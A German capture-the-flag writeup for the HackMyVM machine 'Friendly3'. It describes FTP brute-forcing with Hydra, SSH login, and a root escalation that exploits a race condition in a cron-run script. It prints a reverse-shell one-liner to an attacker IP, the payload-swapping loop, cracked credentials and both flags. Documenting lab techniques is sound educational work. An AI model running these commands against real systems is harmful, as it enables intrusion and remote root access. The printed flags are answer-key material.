# Friendly3 - HackMyVM Writeup

![Friendly3 Icon](Friendly3.png)

## Übersicht

*   **VM:** Friendly3
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Friendly3)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 24. Juni 2025
*   **Original-Writeup:** https://alientec1908.github.io/Friendly3_HackMyVM_Easy/
*   **Autor:** Ben C.

---

**Disclaimer:**

Dieser Writeup dient ausschließlich zu Bildungszwecken und dokumentiert Techniken, die in einer kontrollierten Testumgebung (HackTheBox/HackMyVM) angewendet wurden. Die Anwendung dieser Techniken auf Systeme, für die keine ausdrückliche Genehmigung vorliegt, ist illegal und ethisch nicht vertretbar. Der Autor und der Ersteller dieses README übernehmen keine Verantwortung für jeglichen Missbrauch der hier beschriebenen Informationen.

---

## Zusammenfassung

Die Box "Friendly3" begann mit einer grundlegenden Enumeration offener Dienste. Schnell wurde ein anonymer FTP-Zugang sowie ein Webserver auf Port 80 entdeckt. Ein wichtiger Hinweis auf der Webseite verwies auf einen Benutzer namens "juan" und neu hochgeladene Dateien auf dem FTP-Server. Durch einen Brute-Force-Angriff auf den FTP-Dienst konnte das Passwort für "juan" gefunden und anschließend für den SSH-Login verwendet werden.

Als Benutzer "juan" wurde das System auf mögliche Privilegieneskalationspfade untersucht. Dabei wurde ein Skript in `/opt/` gefunden, das periodisch eine Datei von einem lokalen Webserver herunterlädt und als Root ausführt. Durch Ausnutzung einer Race Condition während dieses Prozesses konnte eine eigene bösartige Datei eingeschleust und als Root ausgeführt werden, was zu einer Root-Shell führte.

## Technische Details

*   **Betriebssystem:** Debian (basierend auf Nmap-Erkennung und SSH-Banner)
*   **Offene Ports:**
    *   `21/tcp`: FTP (vsftpd 3.0.3, anonymous login allowed)
    *   `22/tcp`: SSH (OpenSSH 9.2p1)
    *   `80/tcp`: HTTP (nginx 1.22.1)

## Enumeration

1.  **ARP-Scan:** Identifizierung der Ziel-IP (192.168.2.59).
2.  **`/etc/hosts` Eintrag:** Hinzufügen von `friendly.hmv` zur lokalen hosts-Datei.
3.  **Nmap Scan:** Identifizierung offener Ports 21 (FTP), 22 (SSH) und 80 (HTTP). Nmap zeigte, dass anonymer FTP-Zugang erlaubt war.
4.  **Web Enumeration (Port 80):**
    *   Zeigt die Standard-Nginx-Willkommensseite mit einem zusätzlichen Hinweis: "Hi, sysadmin I want you to know that I've just uploaded the new files into the FTP Server. See you, juan."
    *   Nikto Scan: Fund von fehlenden Sicherheits-Headern und einer irrelevanten `#wp-config.php#` Meldung.
5.  **FTP Enumeration (Port 21):**
    *   Anonymer FTP-Login war erfolgreich.
    *   Die Verzeichnisliste zeigte zahlreiche leere Dateien (`file1` bis `file100`, `foldX`, etc.), die alle Root gehörten.
    *   Einige Dateien in den Ordnern (`file80`, `.test.txt` in `fold10`, `yt.txt` in `fold5`, `passwd.txt` in `fold8`) enthielten scheinbar zufällige Texte oder ASCII-Kunst, sowie Hinweise auf "juan", "sysadmin" und eine Datei namens "zlcnffjbeq.gkg" mit dem Inhalt "cookie".
6.  **FTP Brute-Force:** Basierend auf dem Benutzernamen "juan" aus dem Webseiten-Hinweis wurde ein Hydra-Brute-Force-Angriff auf den FTP-Dienst durchgeführt. Das Passwort `alexis` für den Benutzer `juan` wurde gefunden.

## Initialer Zugriff (SSH als juan)

1.  **SSH Login:** Mit den gefundenen Anmeldedaten (`juan:alexis`) war ein Login via SSH erfolgreich, obwohl der ursprüngliche Hinweis nur auf FTP abzielte.
2.  **Systemerkundung als `juan`:** Im Home-Verzeichnis von `juan` wurde die Datei `user.txt` gefunden.

## Privilegieneskalation (juan -> root)

1.  **User Flag:** Der Inhalt von `/home/juan/user.txt` war `cb40b159c8086733d57280de3f97de30`.
2.  **Cronjob / Skript Entdeckung:** Bei der Erkundung des Systems wurde das Skript `/opt/check_for_install.sh` gefunden. Dieses Skript, das Root gehört und ausführbar ist, lädt eine Datei namens `9842734723948024.bash` von `http://127.0.0.1/` nach `/tmp/a.bash`, macht sie ausführbar und führt sie dann als Root aus, bevor sie gelöscht wird.
3.  **Analyse der Schwachstelle:** Das Skript `/opt/check_for_install.sh` wird offenbar regelmäßig als Root ausgeführt (vermutlich via Cron oder systemd Timer, auch wenn die Standard-Crontabs das Skript nicht direkt zeigten). Es lädt die Datei aus `/var/www/html/98424734723948024.bash` (da 127.0.0.1 auf den lokalen Nginx auf Port 80 zeigt, der `/var/www/html/` serviert) in das `/tmp`-Verzeichnis. Das `/tmp`-Verzeichnis ist global schreibbar. Juan hat als normaler Benutzer keine Schreibrechte in `/var/www/html/`. Allerdings besteht eine Race Condition zwischen dem Herunterladen der Datei nach `/tmp/a.bash` und deren Ausführung.
4.  **Ausnutzung der Race Condition:** Ein Reverse Shell Payload (`/bin/bash -i >& /dev/tcp/192.168.2.199/4444 0>&1`) wurde in einer Datei (`payload.sh`) in einem Verzeichnis platziert, in das `juan` schreiben kann (z.B. `/home/juan/`). Anschließend wurde als Benutzer `juan` eine Endlosschleife gestartet, die diese Datei ständig nach `/tmp/a.bash` kopiert (`while true; do cp /home/juan/payload.sh /tmp/a.bash; done`).
5.  **Trigger und Root Shell:** Wenn das Root-Skript `/opt/check_for_install.sh` als Cronjob läuft, lädt es die ursprüngliche Datei von `http://127.0.0.1/` nach `/tmp/a.bash`. Unmittelbar danach überschreibt die Endlosschleife von `juan` diese Datei mit dem Reverse Shell Payload. Das Root-Skript führt dann die manipulierte `/tmp/a.bash` aus, was zur Etablierung einer Root-Shell führt.
6.  **Ergebnis:** Eine Reverse Shell wurde auf dem Lauschport (4444) des Angreifers als Benutzer `root` empfangen.

## Finalisierung (Root Shell)

1.  **Root-Zugriff:** In der Root-Shell konnte auf das Root-Verzeichnis zugegriffen werden.
2.  **Root-Flag:** Die Datei `root.txt` im `/root`-Verzeichnis wurde gefunden und ihr Inhalt ausgelesen.

## Flags

*   **user.txt:** `cb40b159c8086733d57280de3f97de30` (Gefunden unter `/home/juan/user.txt`)
*   **root.txt:** `eb9748b67f25e6bd202e5fa25f534d51` (Gefunden unter `/root/root.txt`)

---
